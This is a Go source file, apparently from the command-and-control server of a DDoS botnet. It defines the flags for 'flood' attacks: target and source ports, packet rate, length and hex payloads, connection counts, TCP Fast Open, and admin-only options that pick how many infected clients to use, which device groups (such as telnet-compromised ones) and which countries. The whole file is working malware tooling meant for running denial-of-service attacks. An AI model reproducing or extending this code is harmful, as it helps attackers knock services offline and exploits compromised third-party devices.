package floods

import (
	"cnc/internal/master/floods/flags"
	"cnc/pkg/logging"
)

// FlagList is the list of flags
var FlagList = make(map[string]*flags.Flag)

const (
	FlagDestinationPort = iota
	FlagSourcePort

	FlagSleep
	FlagConns
	FlagRepeat

	FlagLength
	FlagMinLength
	FlagMaxLength

	FlagRand
	FlagPayload

	FlagFastOpen

	/* Clientside */

	FlagGroup
	FlagCount
	FlagCountry
	FlagPayloadProfile
)

func NewFlag(id uint8, name, description string, flagType flags.FlagType, options ...flags.FlagOption) {
	var flag = &flags.Flag{
		ID:          id,
		Name:        name,
		Description: description,
		Type:        flagType,
		Options:     new(flags.FlagOptions),
	}

	for _, option := range options {
		_ = option(flag.Options)
	}

	FlagList[name] = flag
	logging.Global.Debug().
		Str("name", name).
		Str("type", flagType.Name()).
		Msg("Added flag")
}

func initFlags() {
	NewFlag(
		FlagDestinationPort,
		"dport",
		"Destination port of the target, default is random",
		flags.NewUint16Flag(1, -1),
	)

	NewFlag(
		FlagSourcePort,
		"sport",
		"Source port of a target, default is random",
		flags.NewUint16Flag(1, -1),
	)

	NewFlag(
		FlagSleep,
		"sleep",
		"Microseconds of sleep between packets, default is 0",
		flags.NewUint32Flag(1, -1),
	)

	NewFlag(
		FlagConns,
		"conns",
		"Simultaneous connections",
		flags.NewUint16Flag(1, 1024),
	)

	NewFlag(
		FlagRepeat,
		"repeat",
		"Packets sent every connection",
		flags.NewUint16Flag(1, -1),
	)

	NewFlag(
		FlagLength,
		"len",
		"Packet length, default is 512",
		flags.NewUint16Flag(1, 1400),
	)

	NewFlag(
		FlagMinLength,
		"minlen",
		"Minimum packet length, default is 0",
		flags.NewUint16Flag(1, 1400),
	)

	NewFlag(
		FlagMaxLength,
		"maxlen",
		"Maximum packet length, default is 0",
		flags.NewUint16Flag(1, 1400),
	)

	NewFlag(
		FlagPayload,
		"payload",
		"Packet contents, parsed in hexadecimal streams. Example: aabbcd123",
		flags.NewHexFlag(2048),
	)

	NewFlag(
		FlagRand,
		"rand",
		"Whether to randomize packet data, default is true",
		flags.NewBooleanFlag(),
	)

	NewFlag(
		FlagFastOpen,
		"tfo",
		"TCP Fast Open (TFO) cookie request, default is false",
		flags.NewBooleanFlag(),
	)

	NewFlag(
		FlagCount,
		"count",
		"Number of clients to use in the flood, default is all available clients",
		flags.NewUint32Flag(0, 2147483647),
		flags.Clientside(),
		flags.AdminOnly(),
	)

	NewFlag(
		FlagGroup,
		"group",
		"Specific groups of clients to use in the flood. Example: telnet,fiber",
		flags.NewStringFlag(2147483647),
		flags.Clientside(),
		flags.AdminOnly(),
	)

	NewFlag(
		FlagCountry,
		"country",
		"Countries to use in the flood, default is all countries",
		flags.NewStringFlag(2147483647),
		flags.Clientside(),
		flags.AdminOnly(),
		flags.Invisible(),
	)

	NewFlag(
		FlagPayloadProfile,
		"profile",
		"Preset payload used in the flood. (profile=? for all profiles)",
		flags.NewChoiceFlag(availablePresets()...),
		flags.Clientside(),
	)
}
